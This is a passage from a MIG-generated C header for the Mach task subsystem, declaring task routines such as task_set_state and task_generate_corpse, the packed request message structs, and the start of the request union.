mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_set_ras_pc
(
	task_t target_task,
	vm_address_t basepc,
	vm_address_t boundspc
);

/* Routine task_zone_info */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_zone_info
(
	task_inspect_t target_task,
	mach_zone_name_array_t *names,
	mach_msg_type_number_t *namesCnt,
	task_zone_info_array_t *info,
	mach_msg_type_number_t *infoCnt
);

/* Routine task_assign */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_assign
(
	task_t task,
	processor_set_t new_set,
	boolean_t assign_threads
);

/* Routine task_assign_default */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_assign_default
(
	task_t task,
	boolean_t assign_threads
);

/* Routine task_get_assignment */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_get_assignment
(
	task_inspect_t task,
	processor_set_name_t *assigned_set
);

/* Routine task_set_policy */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_set_policy
(
	task_t task,
	processor_set_t pset,
	policy_t policy,
	policy_base_t base,
	mach_msg_type_number_t baseCnt,
	policy_limit_t limit,
	mach_msg_type_number_t limitCnt,
	boolean_t change
);

/* Routine task_get_state */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_get_state
(
	task_read_t task,
	thread_state_flavor_t flavor,
	thread_state_t old_state,
	mach_msg_type_number_t *old_stateCnt
);

/* Routine task_set_state */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_set_state
(
	task_t task,
	thread_state_flavor_t flavor,
	thread_state_t new_state,
	mach_msg_type_number_t new_stateCnt
);

/* Routine task_set_phys_footprint_limit */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_set_phys_footprint_limit
(
	task_t task,
	int new_limit,
	int *old_limit
);

/* Routine task_suspend2 */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_suspend2
(
	task_read_t target_task,
	task_suspension_token_t *suspend_token
);

/* Routine task_resume2 */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_resume2
(
	task_suspension_token_t suspend_token
);

/* Routine task_purgable_info */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_purgable_info
(
	task_inspect_t task,
	task_purgable_info_t *stats
);

/* Routine task_get_mach_voucher */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_get_mach_voucher
(
	task_read_t task,
	mach_voucher_selector_t which,
	ipc_voucher_t *voucher
);

/* Routine task_set_mach_voucher */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_set_mach_voucher
(
	task_t task,
	ipc_voucher_t voucher
);

/* Routine task_swap_mach_voucher */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_swap_mach_voucher
(
	task_t task,
	ipc_voucher_t new_voucher,
	ipc_voucher_t *old_voucher
);

/* Routine task_generate_corpse */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_generate_corpse
(
	task_read_t task,
	mach_port_t *corpse_task_port
);

/* Routine task_map_corpse_info */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_map_corpse_info
(
	task_t task,
	task_read_t corspe_task,
	vm_address_t *kcd_addr_begin,
	uint32_t *kcd_size
);

/* Routine task_register_dyld_image_infos */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_register_dyld_image_infos
(
	task_t task,
	dyld_kernel_image_info_array_t dyld_images,
	mach_msg_type_number_t dyld_imagesCnt
);

/* Routine task_unregister_dyld_image_infos */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_unregister_dyld_image_infos
(
	task_t task,
	dyld_kernel_image_info_array_t dyld_images,
	mach_msg_type_number_t dyld_imagesCnt
);

/* Routine task_get_dyld_image_infos */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_get_dyld_image_infos
(
	task_read_t task,
	dyld_kernel_image_info_array_t *dyld_images,
	mach_msg_type_number_t *dyld_imagesCnt
);

/* Routine task_register_dyld_shared_cache_image_info */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_register_dyld_shared_cache_image_info
(
	task_t task,
	dyld_kernel_image_info_t dyld_cache_image,
	boolean_t no_cache,
	boolean_t private_cache
);

/* Routine task_register_dyld_set_dyld_state */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_register_dyld_set_dyld_state
(
	task_t task,
	uint8_t dyld_state
);

/* Routine task_register_dyld_get_process_state */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_register_dyld_get_process_state
(
	task_t task,
	dyld_kernel_process_info_t *dyld_process_state
);

/* Routine task_map_corpse_info_64 */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_map_corpse_info_64
(
	task_t task,
	task_read_t corspe_task,
	mach_vm_address_t *kcd_addr_begin,
	mach_vm_size_t *kcd_size
);

/* Routine task_inspect */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_inspect
(
	task_inspect_t task,
	task_inspect_flavor_t flavor,
	task_inspect_info_t info_out,
	mach_msg_type_number_t *info_outCnt
);

/* Routine task_get_exc_guard_behavior */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_get_exc_guard_behavior
(
	task_inspect_t task,
	task_exc_guard_behavior_t *behavior
);

/* Routine task_set_exc_guard_behavior */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_set_exc_guard_behavior
(
	task_t task,
	task_exc_guard_behavior_t behavior
);

/* Routine task_dyld_process_info_notify_register */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_dyld_process_info_notify_register
(
	task_read_t target_task,
	mach_port_t notify
);

/* Routine task_create_identity_token */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_create_identity_token
(
	task_t task,
	task_id_token_t *token
);

/* Routine task_identity_token_get_task_port */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_identity_token_get_task_port
(
	task_id_token_t token,
	task_flavor_t flavor,
	mach_port_t *task_port
);

/* Routine task_dyld_process_info_notify_deregister */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_dyld_process_info_notify_deregister
(
	task_read_t target_task,
	mach_port_name_t notify
);

/* Routine task_get_exception_ports_info */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_get_exception_ports_info
(
	mach_port_t port,
	exception_mask_t exception_mask,
	exception_mask_array_t masks,
	mach_msg_type_number_t *masksCnt,
	exception_handler_info_array_t old_handlers_info,
	exception_behavior_array_t old_behaviors,
	exception_flavor_array_t old_flavors
);

/* Routine task_test_sync_upcall */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_test_sync_upcall
(
	task_t task,
	mach_port_t port
);

/* Routine task_set_corpse_forking_behavior */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_set_corpse_forking_behavior
(
	task_t task,
	task_corpse_forking_behavior_t behavior
);

/* Routine task_test_async_upcall_propagation */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_test_async_upcall_propagation
(
	task_t task,
	mach_port_t port,
	int qos,
	int iotier
);

/* Routine task_map_kcdata_object_64 */
#ifdef	mig_external
mig_external
#else
extern
#endif	/* mig_external */
kern_return_t task_map_kcdata_object_64
(
	task_t task,
	kcdata_object_t kcdata_object,
	mach_vm_address_t *kcd_addr_begin,
	mach_vm_size_t *kcd_size
);

__END_DECLS

/********************** Caution **************************/
/* The following data types should be used to calculate  */
/* maximum message sizes only. The actual message may be */
/* smaller, and the position of the arguments within the */
/* message layout may vary from what is presented here.  */
/* For example, if any of the arguments are variable-    */
/* sized, and less than the maximum is sent, the data    */
/* will be packed tight in the actual message to reduce  */
/* the presence of holes.                                */
/********************** Caution **************************/

/* typedefs for all requests */

#ifndef __Request__task_subsystem__defined
#define __Request__task_subsystem__defined

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_ports_descriptor_t ledgers;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t ledgersCnt;
		boolean_t inherit_memory;
	} __Request__task_create_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__task_terminate_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__task_threads_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_ports_descriptor_t init_port_set;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t init_port_setCnt;
	} __Request__mach_ports_register_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__mach_ports_lookup_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		task_flavor_t flavor;
		mach_msg_type_number_t task_info_outCnt;
	} __Request__task_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		task_flavor_t flavor;
		mach_msg_type_number_t task_info_inCnt;
		integer_t task_info_in[90];
	} __Request__task_set_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__task_suspend_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__task_resume_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		int which_port;
	} __Request__task_get_special_port_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t special_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		int which_port;
	} __Request__task_set_special_port_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__thread_create_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		thread_state_flavor_t flavor;
		mach_msg_type_number_t new_stateCnt;
		natural_t new_state[1296];
	} __Request__thread_create_running_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		exception_mask_t exception_mask;
		exception_behavior_t behavior;
		thread_state_flavor_t new_flavor;
	} __Request__task_set_exception_ports_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		exception_mask_t exception_mask;
	} __Request__task_get_exception_ports_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		exception_mask_t exception_mask;
		exception_behavior_t behavior;
		thread_state_flavor_t new_flavor;
	} __Request__task_swap_exception_ports_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		int n_ulocks;
		int policy;
	} __Request__lock_set_create_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t lock_set;
		/* end of the kernel processed data */
	} __Request__lock_set_destroy_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		int policy;
		int value;
	} __Request__semaphore_create_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t semaphore;
		/* end of the kernel processed data */
	} __Request__semaphore_destroy_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		task_policy_flavor_t flavor;
		mach_msg_type_number_t policy_infoCnt;
		integer_t policy_info[16];
	} __Request__task_policy_set_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		task_policy_flavor_t flavor;
		mach_msg_type_number_t policy_infoCnt;
		boolean_t get_default;
	} __Request__task_policy_get_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t reply;
		/* end of the kernel processed data */
	} __Request__task_sample_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		policy_t policy;
		mach_msg_type_number_t baseCnt;
		integer_t base[5];
		boolean_t set_limit;
		boolean_t change;
	} __Request__task_policy_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		vm_address_t routine_entry_pt;
		int routine_number;
	} __Request__task_set_emulation_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__task_get_emulation_vector_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t emulation_vector;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		int vector_start;
		mach_msg_type_number_t emulation_vectorCnt;
	} __Request__task_set_emulation_vector_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		vm_address_t basepc;
		vm_address_t boundspc;
	} __Request__task_set_ras_pc_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__task_zone_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_set;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		boolean_t assign_threads;
	} __Request__task_assign_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		boolean_t assign_threads;
	} __Request__task_assign_default_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__task_get_assignment_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t pset;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		policy_t policy;
		mach_msg_type_number_t baseCnt;
		integer_t base[5];
		mach_msg_type_number_t limitCnt;
		integer_t limit[1];
		boolean_t change;
	} __Request__task_set_policy_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		thread_state_flavor_t flavor;
		mach_msg_type_number_t old_stateCnt;
	} __Request__task_get_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		thread_state_flavor_t flavor;
		mach_msg_type_number_t new_stateCnt;
		natural_t new_state[1296];
	} __Request__task_set_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		int new_limit;
	} __Request__task_set_phys_footprint_limit_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__task_suspend2_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__task_resume2_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__task_purgable_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_voucher_selector_t which;
	} __Request__task_get_mach_voucher_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t voucher;
		/* end of the kernel processed data */
	} __Request__task_set_mach_voucher_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_voucher;
		mach_msg_port_descriptor_t old_voucher;
		/* end of the kernel processed data */
	} __Request__task_swap_mach_voucher_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__task_generate_corpse_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t corspe_task;
		/* end of the kernel processed data */
	} __Request__task_map_corpse_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t dyld_images;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t dyld_imagesCnt;
	} __Request__task_register_dyld_image_infos_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_ool_descriptor_t dyld_images;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		mach_msg_type_number_t dyld_imagesCnt;
	} __Request__task_unregister_dyld_image_infos_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__task_get_dyld_image_infos_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		dyld_kernel_image_info_t dyld_cache_image;
		boolean_t no_cache;
		boolean_t private_cache;
	} __Request__task_register_dyld_shared_cache_image_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		uint8_t dyld_state;
		char dyld_statePad[3];
	} __Request__task_register_dyld_set_dyld_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__task_register_dyld_get_process_state_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t corspe_task;
		/* end of the kernel processed data */
	} __Request__task_map_corpse_info_64_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		task_inspect_flavor_t flavor;
		mach_msg_type_number_t info_outCnt;
	} __Request__task_inspect_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__task_get_exc_guard_behavior_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		task_exc_guard_behavior_t behavior;
	} __Request__task_set_exc_guard_behavior_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t notify;
		/* end of the kernel processed data */
	} __Request__task_dyld_process_info_notify_register_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} __Request__task_create_identity_token_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		task_flavor_t flavor;
	} __Request__task_identity_token_get_task_port_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		mach_port_name_t notify;
	} __Request__task_dyld_process_info_notify_deregister_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		exception_mask_t exception_mask;
	} __Request__task_get_exception_ports_info_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t port;
		/* end of the kernel processed data */
	} __Request__task_test_sync_upcall_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		task_corpse_forking_behavior_t behavior;
	} __Request__task_set_corpse_forking_behavior_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t port;
		/* end of the kernel processed data */
		NDR_record_t NDR;
		int qos;
		int iotier;
	} __Request__task_test_async_upcall_propagation_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t kcdata_object;
		/* end of the kernel processed data */
	} __Request__task_map_kcdata_object_64_t __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
#endif /* !__Request__task_subsystem__defined */

/* union of all requests */

#ifndef __RequestUnion__task_subsystem__defined
#define __RequestUnion__task_subsystem__defined
union __RequestUnion__task_subsystem {
	__Request__task_create_t Request_task_create;
	__Request__task_terminate_t Request_task_terminate;
	__Request__task_threads_t Request_task_threads;
	__Request__mach_ports_register_t Request_mach_ports_register;
	__Request__mach_ports_lookup_t Request_mach_ports_lookup;
	__Request__task_info_t Request_task_info;
	__Request__task_set_info_t Request_task_set_info;
	__Request__task_suspend_t Request_task_suspend;
	__Request__task_resume_t Request_task_resume;
	__Request__task_get_special_port_t Request_task_get_special_port;
	__Request__task_set_special_port_t Request_task_set_special_port;
	__Request__thread_create_t Request_thread_create;
	__Request__thread_create_running_t Request_thread_create_running;
	__Request__task_set_exception_ports_t Request_task_set_exception_ports;
	__Request__task_get_exception_ports_t Request_task_get_exception_ports;
	__Request__task_swap_exception_ports_t Request_task_swap_exception_ports;
	__Request__lock_set_create_t Request_lock_set_create;
	__Request__lock_set_destroy_t Request_lock_set_destroy;
	__Request__semaphore_create_t Request_semaphore_create;
	__Request__semaphore_destroy_t Request_semaphore_destroy;
	__Request__task_policy_set_t Request_task_policy_set;
	__Request__task_policy_get_t Request_task_policy_get;
	__Request__task_sample_t Request_task_sample;
	__Request__task_policy_t Request_task_policy;
	__Request__task_set_emulation_t Request_task_set_emulation;
	__Request__task_get_emulation_vector_t Request_task_get_emulation_vector;
	__Request__task_set_emulation_vector_t Request_task_set_emulation_vector;
	__Request__task_set_ras_pc_t Request_task_set_ras_pc;
	__Request__task_zone_info_t Request_task_zone_info;
	__Request__task_assign_t Request_task_assign;
